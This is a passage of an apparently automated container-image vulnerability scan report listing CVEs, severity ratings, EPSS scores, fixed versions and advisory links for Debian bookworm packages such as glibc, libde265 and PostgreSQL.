<details><summary>Description</summary>
<blockquote>

Missing authorization in PostgreSQL built-in views pg_stats_ext and pg_stats_ext_exprs allows an unprivileged database user to read most common values and other statistics from CREATE STATISTICS commands of other users. The most common values may reveal column values the eavesdropper could not otherwise read or results of functions they cannot execute. Installing an unaffected version only fixes fresh PostgreSQL installations, namely those that are created with the initdb utility after installing that version. Current PostgreSQL installations will remain vulnerable until they follow the instructions in the release notes. Within major versions 14-16, minor versions before PostgreSQL 16.3, 15.7, and 14.12 are affected. Versions before PostgreSQL 14 are unaffected.

---
- postgresql-16 16.3-1
- postgresql-15 <removed>
[bookworm] - postgresql-15 15.7-0+deb12u1
- postgresql-13 <not-affected> (Vulnerable code not present)
- postgresql-11 <not-affected> (Vulnerable code not present)
https://www.postgresql.org/support/security/CVE-2024-4317/

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 6" src="https://img.shields.io/badge/H-6-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 10" src="https://img.shields.io/badge/L-10-fce1a9"/> <!-- unspecified: 0 --><strong>glibc</strong> <code>2.36-9+deb12u3</code> (deb)</summary>

<small><code>pkg:deb/debian/glibc@2.36-9%2Bdeb12u3?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-33599?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u7"><img alt="high : CVE--2024--33599" src="https://img.shields.io/badge/CVE--2024--33599-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.563%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

nscd: Stack-based buffer overflow in netgroup cache  If the Name Service Cache Daemon's (nscd) fixed size cache is exhausted by client requests then a subsequent client request for netgroup data may result in a stack-based buffer overflow.  This flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.

---
- glibc 2.37-19
https://sourceware.org/bugzilla/show_bug.cgi?id=31677
https://inbox.sourceware.org/libc-alpha/cover.1713974801.git.fweimer@redhat.com/
https://www.openwall.com/lists/oss-security/2024/04/24/2
https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0005
Fixed by: https://sourceware.org/git?p=glibc.git;a=commit;h=87801a8fd06db1d654eea3e4f7626ff476a9bdaa

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-4802?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u11"><img alt="high : CVE--2025--4802" src="https://img.shields.io/badge/CVE--2025--4802-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u11</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u11</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.012%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Untrusted LD_LIBRARY_PATH environment variable vulnerability in the GNU C Library version 2.27 to 2.38 allows attacker controlled loading of dynamically shared library in statically compiled setuid binaries that call dlopen (including internal dlopen calls after setlocale or calls to NSS functions such as getaddrinfo).

---
- glibc 2.39-4
[bookworm] - glibc 2.36-9+deb12u11
Introduced with: https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=10e93d968716ab82931d593bada121c17c0a4b93 (glibc-2.27)
Fixed by: https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=5451fa962cd0a90a0e2ec1d8910a559ace02bba0 (glibc-2.39)
https://sourceware.org/bugzilla/show_bug.cgi?id=32976
https://www.openwall.com/lists/oss-security/2025/05/17/2

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-0395?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u10"><img alt="high : CVE--2025--0395" src="https://img.shields.io/badge/CVE--2025--0395-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u10</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u10</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.645%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When the assert() function in the GNU C Library versions 2.13 to 2.40 fails, it does not allocate enough space for the assertion failure message string and size information, which may lead to a buffer overflow if the message string size aligns to page size.

---
- glibc 2.40-6
[bookworm] - glibc 2.36-9+deb12u10
https://sourceware.org/bugzilla/show_bug.cgi?id=32582
https://www.openwall.com/lists/oss-security/2025/01/22/4
Fixed by: https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=7d4b6bcae91f29d7b4daf15bab06b66cf1d2217c (2.40-branch)
Fixed by: https://sourceware.org/git/gitweb.cgi?p=glibc.git;h=7971add7ee4171fdd8dfd17e7c04c4ed77a18845 (2.36-branch)
https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2025-0001
https://sourceware.org/pipermail/libc-announce/2025/000044.html

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-33602?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u7"><img alt="high : CVE--2024--33602" src="https://img.shields.io/badge/CVE--2024--33602-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.331%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

nscd: netgroup cache assumes NSS callback uses in-buffer strings  The Name Service Cache Daemon's (nscd) netgroup cache can corrupt memory when the NSS callback does not store all strings in the provided buffer. The flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.

---
- glibc 2.37-19
https://sourceware.org/bugzilla/show_bug.cgi?id=31680
https://inbox.sourceware.org/libc-alpha/cover.1713974801.git.fweimer@redhat.com/
https://www.openwall.com/lists/oss-security/2024/04/24/2
https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0008
Fixed by: https://sourceware.org/git?p=glibc.git;a=commit;h=c04a21e050d64a1193a6daab872bca2528bda44b

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-33601?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u7"><img alt="high : CVE--2024--33601" src="https://img.shields.io/badge/CVE--2024--33601-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.104%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

nscd: netgroup cache may terminate daemon on memory allocation failure  The Name Service Cache Daemon's (nscd) netgroup cache uses xmalloc or xrealloc and these functions may terminate the process due to a memory allocation failure resulting in a denial of service to the clients.  The flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.

---
- glibc 2.37-19
https://sourceware.org/bugzilla/show_bug.cgi?id=31679
https://inbox.sourceware.org/libc-alpha/cover.1713974801.git.fweimer@redhat.com/
https://www.openwall.com/lists/oss-security/2024/04/24/2
https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0007
Fixed by: https://sourceware.org/git?p=glibc.git;a=commit;h=c04a21e050d64a1193a6daab872bca2528bda44b

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-2961?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u6"><img alt="high : CVE--2024--2961" src="https://img.shields.io/badge/CVE--2024--2961-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u6</code></td></tr>
<tr><td>EPSS Score</td><td><code>92.860%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>100th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The iconv() function in the GNU C Library versions 2.39 and older may overflow the output buffer passed to it by up to 4 bytes when converting strings to the ISO-2022-CN-EXT character set, which may be used to crash an application or overwrite a neighbouring variable.

---
- glibc 2.37-18 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1069191)
https://www.openwall.com/lists/oss-security/2024/04/17/9
https://www.openwall.com/lists/oss-security/2024/04/18/4
https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0004
Introduced by: https://sourceware.org/git?p=glibc.git;a=commit;h=755104edc75c53f4a0e7440334e944ad3c6b32fc (cvs/libc-2_1_94)
Fixed by: https://sourceware.org/git?p=glibc.git;a=commit;h=f9dc609e06b1136bb0408be9605ce7973a767ada
https://www.ambionics.io/blog/iconv-cve-2024-2961-p1
https://github.com/ambionics/cnext-exploits/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8058?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u13"><img alt="medium : CVE--2025--8058" src="https://img.shields.io/badge/CVE--2025--8058-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u13</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u13</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.007%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The regcomp function in the GNU C library version from 2.4 to 2.41 is  subject to a double free if some previous allocation fails. It can be  accomplished either by a malloc failure or by using an interposed malloc  that injects random malloc failures. The double free can allow buffer  manipulation depending of how the regex is constructed. This issue  affects all architectures and ABIs supported by the GNU C library.

---
- glibc 2.41-11 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1109803)
[bookworm] - glibc 2.36-9+deb12u13
[bullseye] - glibc <postponed> (Minor issue)
https://sourceware.org/bugzilla/show_bug.cgi?id=33185
https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2025-0005
Inroduced with: https://sourceware.org/git/?p=glibc.git;a=commit;h=963d8d782fc98fb6dc3a66f0068795f9920c269d
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=7ea06e994093fa0bcca0d0ee2c1db271d8d7885d

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-33600?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u7"><img alt="medium : CVE--2024--33600" src="https://img.shields.io/badge/CVE--2024--33600-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u7</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u7</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.203%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

nscd: Null pointer crashes after notfound response  If the Name Service Cache Daemon's (nscd) cache fails to add a not-found netgroup response to the cache, the client request can result in a null pointer dereference.  This flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.

---
- glibc 2.37-19
https://sourceware.org/bugzilla/show_bug.cgi?id=31678
https://inbox.sourceware.org/libc-alpha/cover.1713974801.git.fweimer@redhat.com/
https://www.openwall.com/lists/oss-security/2024/04/24/2
https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0006
Fixed by: https://sourceware.org/git?p=glibc.git;a=commit;h=b048a482f088e53144d26a61c390bed0210f49f2
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=7835b00dbce53c3c87bbbb1754a95fb5e58187aa

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-6780?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u4"><img alt="low : CVE--2023--6780" src="https://img.shields.io/badge/CVE--2023--6780-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.234%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>46th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An integer overflow was found in the __vsyslog_internal function of the glibc library. This function is called by the syslog and vsyslog functions. This issue occurs when these functions are called with a very long message, leading to an incorrect calculation of the buffer size to store the message, resulting in undefined behavior. This issue affects glibc 2.37 and newer.

---
- glibc 2.37-15
[bullseye] - glibc <not-affected> (Vulnerable code not present)
[buster] - glibc <not-affected> (Vulnerable code not present)
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=ddf542da94caf97ff43cc2875c88749880b7259b
https://sourceware.org/pipermail/libc-announce/2024/000037.html
https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2024-0003;hb=HEAD
https://sourceware.org/cgit/glibc/tree/advisories/GLIBC-SA-2024-0003

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-6779?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u4"><img alt="low : CVE--2023--6779" src="https://img.shields.io/badge/CVE--2023--6779-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.608%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An off-by-one heap-based buffer overflow was found in the __vsyslog_internal function of the glibc library. This function is called by the syslog and vsyslog functions. This issue occurs when these functions are called with a message bigger than INT_MAX bytes, leading to an incorrect calculation of the buffer size to store the message, resulting in an application crash. This issue affects glibc 2.37 and newer.

---
- glibc 2.37-15
[bullseye] - glibc <not-affected> (Vulnerable code not present)
[buster] - glibc <not-affected> (Vulnerable code not present)
Fixed by: https://sourceware.org/git/?p=glibc.git;a=commit;h=7e5a0c286da33159d47d0122007aac016f3e02cd
https://sourceware.org/pipermail/libc-announce/2024/000037.html
https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2024-0002;hb=HEAD
https://sourceware.org/cgit/glibc/tree/advisories/GLIBC-SA-2024-0002

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-6246?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.36-9%2Bdeb12u4"><img alt="low : CVE--2023--6246" src="https://img.shields.io/badge/CVE--2023--6246-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.36-9+deb12u4</code></td></tr>
<tr><td>Fixed version</td><td><code>2.36-9+deb12u4</code></td></tr>
<tr><td>EPSS Score</td><td><code>24.316%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>96th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-based buffer overflow was found in the __vsyslog_internal function of the glibc library. This function is called by the syslog and vsyslog functions. This issue occurs when the openlog function was not called, or called with the ident argument set to NULL, and the program name (the basename of argv[0]) is bigger than 1024 bytes, resulting in an application crash or local privilege escalation. This issue affects glibc 2.36 and newer.

---
- glibc 2.37-15
[bullseye] - glibc <not-affected> (Vulnerable code not present)
[buster] - glibc <not-affected> (Vulnerable code not present)
https://www.qualys.com/2024/01/30/syslog
Introduced by: https://sourceware.org/git?p=glibc.git;a=commit;h=52a5be0df411ef3ff45c10c7c308cb92993d15b1
Fixed by: https://sourceware.org/git?p=glibc.git;a=commit;h=6bd0e4efcc78f3c0115e5ea9739a1642807450da
https://sourceware.org/pipermail/libc-announce/2024/000037.html
https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2024-0001;hb=HEAD
https://sourceware.org/cgit/glibc/tree/advisories/GLIBC-SA-2024-0001

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-9192?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.36-9%2Bdeb12u13"><img alt="low : CVE--2019--9192" src="https://img.shields.io/badge/CVE--2019--9192-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.36-9+deb12u13</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.841%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>74th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(|)(\\1\\1)*' in grep, a different issue than CVE-2018-20796. NOTE: the software maintainer disputes that this is a vulnerability because the behavior occurs only with a crafted pattern

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=24269

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010025?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.36-9%2Bdeb12u13"><img alt="low : CVE--2019--1010025" src="https://img.shields.io/badge/CVE--2019--1010025-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.36-9+deb12u13</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.239%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>79th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may guess the heap addresses of pthread_created thread. The component is: glibc. NOTE: the vendor's position is "ASLR bypass itself is not a vulnerability.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22853

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010024?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.36-9%2Bdeb12u13"><img alt="low : CVE--2019--1010024" src="https://img.shields.io/badge/CVE--2019--1010024-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.36-9+deb12u13</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.646%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass ASLR using cache of thread stack and heap. The component is: glibc. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22852

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010023?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.36-9%2Bdeb12u13"><img alt="low : CVE--2019--1010023" src="https://img.shields.io/badge/CVE--2019--1010023-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.36-9+deb12u13</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.313%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Re-mapping current loaded library with malicious ELF file. The impact is: In worst case attacker may evaluate privileges. The component is: libld. The attack vector is: Attacker sends 2 ELF files to victim and asks to run ldd on it. ldd execute code. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22851

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-1010022?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.36-9%2Bdeb12u13"><img alt="low : CVE--2019--1010022" src="https://img.shields.io/badge/CVE--2019--1010022-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.36-9+deb12u13</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GNU Libc current is affected by: Mitigation bypass. The impact is: Attacker may bypass stack guard protection. The component is: nptl. The attack vector is: Exploit stack buffer overflow vulnerability and use this bypass vulnerability to bypass stack guard. NOTE: Upstream comments indicate "this is being treated as a non-security bug and no real threat.

---
- glibc <unfixed> (unimportant)
Not treated as a security issue by upstream
https://sourceware.org/bugzilla/show_bug.cgi?id=22850

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-20796?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.36-9%2Bdeb12u13"><img alt="low : CVE--2018--20796" src="https://img.shields.io/badge/CVE--2018--20796-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.36-9+deb12u13</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.492%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In the GNU C Library (aka glibc or libc6) through 2.29, check_dst_limits_calc_pos_1 in posix/regexec.c has Uncontrolled Recursion, as demonstrated by '(\227|)(\\1\\1|t1|\\\2537)+' in grep.

---
- glibc <unfixed> (unimportant)
- eglibc <removed> (unimportant)
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=34141
https://lists.gnu.org/archive/html/bug-gnulib/2019-01/msg00108.html
No treated as vulnerability: https://sourceware.org/glibc/wiki/Security%20Exceptions

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2010-4756?s=debian&n=glibc&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.36-9%2Bdeb12u13"><img alt="low : CVE--2010--4756" src="https://img.shields.io/badge/CVE--2010--4756-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.36-9+deb12u13</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.371%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>58th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The glob implementation in the GNU C Library (aka glibc or libc6) allows remote authenticated users to cause a denial of service (CPU and memory consumption) via crafted glob expressions that do not match any pathnames, as demonstrated by glob expressions in STAT commands to an FTP daemon, a different vulnerability than CVE-2010-2632.

---
- glibc <removed> (unimportant)
- eglibc <unfixed> (unimportant)
That's standard POSIX behaviour implemented by (e)glibc. Applications using
glob need to impose limits for themselves

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 5" src="https://img.shields.io/badge/H-5-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>libde265</strong> <code>1.0.11-1</code> (deb)</summary>

<small><code>pkg:deb/debian/libde265@1.0.11-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-49468?s=debian&n=libde265&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.0.11-1%2Bdeb12u2"><img alt="high : CVE--2023--49468" src="https://img.shields.io/badge/CVE--2023--49468-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.0.11-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.0.11-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.184%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Libde265 v1.0.14 was discovered to contain a global buffer overflow vulnerability in the read_coding_unit function at slice.cc.

---
- libde265 1.0.15-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059275)
[bookworm] - libde265 1.0.11-1+deb12u2
[bullseye] - libde265 1.0.11-0+deb11u3
https://github.com/strukturag/libde265/issues/432
Fixed by: https://github.com/strukturag/libde265/commit/3e822a3ccf88df1380b165d6ce5a00494a27ceeb (v1.0.15)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-49467?s=debian&n=libde265&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.0.11-1%2Bdeb12u2"><img alt="high : CVE--2023--49467" src="https://img.shields.io/badge/CVE--2023--49467-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.0.11-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.0.11-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.149%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>36th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Libde265 v1.0.14 was discovered to contain a heap-buffer-overflow vulnerability in the derive_combined_bipredictive_merging_candidates function at motion.cc.

---
- libde265 1.0.15-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059275)
[bookworm] - libde265 1.0.11-1+deb12u2
[bullseye] - libde265 1.0.11-0+deb11u3
https://github.com/strukturag/libde265/issues/434
Fixed by: https://github.com/strukturag/libde265/commit/7e4faf254bbd2e52b0f216cb987573a2cce97b54 (v1.0.15)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-49465?s=debian&n=libde265&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.0.11-1%2Bdeb12u2"><img alt="high : CVE--2023--49465" src="https://img.shields.io/badge/CVE--2023--49465-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.0.11-1+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>1.0.11-1+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.120%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Libde265 v1.0.14 was discovered to contain a heap-buffer-overflow vulnerability in the derive_spatial_luma_vector_prediction function at motion.cc.

---
- libde265 1.0.15-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059275)
[bookworm] - libde265 1.0.11-1+deb12u2
[bullseye] - libde265 1.0.11-0+deb11u3
https://github.com/strukturag/libde265/issues/435
Fixed by: https://github.com/strukturag/libde265/commit/1475c7d2f0a6dc35c27e18abc4db9679bfd32568 (v1.0.15)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-27103?s=debian&n=libde265&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.0.11-1%2Bdeb12u1"><img alt="high : CVE--2023--27103" src="https://img.shields.io/badge/CVE--2023--27103-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.0.11-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.0.11-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.619%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Libde265 v1.0.11 was discovered to contain a heap buffer overflow via the function derive_collocated_motion_vectors at motion.cc.

---
- libde265 1.0.12-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1033257)
[bookworm] - libde265 1.0.11-1+deb12u1
[bullseye] - libde265 1.0.11-0+deb11u2
https://github.com/strukturag/libde265/issues/394
https://github.com/strukturag/libde265/commit/d6bf73e765b7a23627bfd7a8645c143fd9097995 (v1.0.12)

</blockquote>
</details>

